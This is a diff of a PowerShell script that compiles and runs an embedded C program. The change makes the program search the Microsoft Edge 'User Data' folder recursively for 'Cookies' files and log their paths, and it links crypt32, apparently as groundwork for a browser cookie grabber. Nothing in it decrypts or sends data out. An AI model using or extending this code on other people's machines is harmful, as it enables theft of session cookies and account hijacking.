@@ -21,7 +21,7 @@ $cProgram = @"
 
 #pragma comment(lib, "crypt32.lib")
 
-void list_directories(const char* base_path, FILE* output_file) {
+void search_for_cookies(const char* base_path, FILE* output_file) {
     struct _finddata_t file_info;
     intptr_t handle;
     char search_path[1024];
@@ -37,7 +37,13 @@ void list_directories(const char* base_path, FILE* output_file) {
     do {
         if (file_info.attrib & _A_SUBDIR) {
             if (strcmp(file_info.name, ".") != 0 && strcmp(file_info.name, "..") != 0) {
-                fprintf(output_file, "Found directory: %s\\%s\n", base_path, file_info.name);
+                char subdir_path[1024];
+                snprintf(subdir_path, sizeof(subdir_path), "%s\\%s", base_path, file_info.name);
+                search_for_cookies(subdir_path, output_file);
+            }
+        } else {
+            if (strcmp(file_info.name, "Cookies") == 0) {
+                fprintf(output_file, "Found Cookies file: %s\\%s\n", base_path, file_info.name);
             }
         }
     } while (_findnext(handle, &file_info) == 0);
@@ -55,32 +61,32 @@ int main() {
     char base_path[1024];
     snprintf(base_path, sizeof(base_path), "%s\\Microsoft\\Edge\\User Data", localAppData);
 
-    FILE* output_file = fopen("edge_profiles.txt", "w");
+    FILE* output_file = fopen("cookies_search.txt", "w");
     if (!output_file) {
         printf("Failed to open output file.\n");
         return 1;
     }
 
-    fprintf(output_file, "Listing directories in %s\n", base_path);
-    list_directories(base_path, output_file);
+    fprintf(output_file, "Searching for Cookies file in %s\n", base_path);
+    search_for_cookies(base_path, output_file);
 
     fclose(output_file);
-    printf("Directory listing saved to edge_profiles.txt\n");
+    printf("Search results saved to cookies_search.txt\n");
 
     return 0;
 }
 "@
 
 # Save the C program to a file
-$cProgramPath = "list_edge_profiles.c"
+$cProgramPath = "search_cookies.c"
 Set-Content -Path $cProgramPath -Value $cProgram
 
 # Compile the C program using w64devkit
 $w64devkitBin = "C:\w64devkit\bin"
 $gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
-$compileCommand = "$gccPath list_edge_profiles.c -o list_edge_profiles -lcrypt32"
+$compileCommand = "$gccPath search_cookies.c -o search_cookies -lcrypt32"
 Invoke-Expression $compileCommand
 
 # Run the compiled executable
-$exePath = ".\list_edge_profiles.exe"
+$exePath = ".\search_cookies.exe"
 Invoke-Expression $exePath
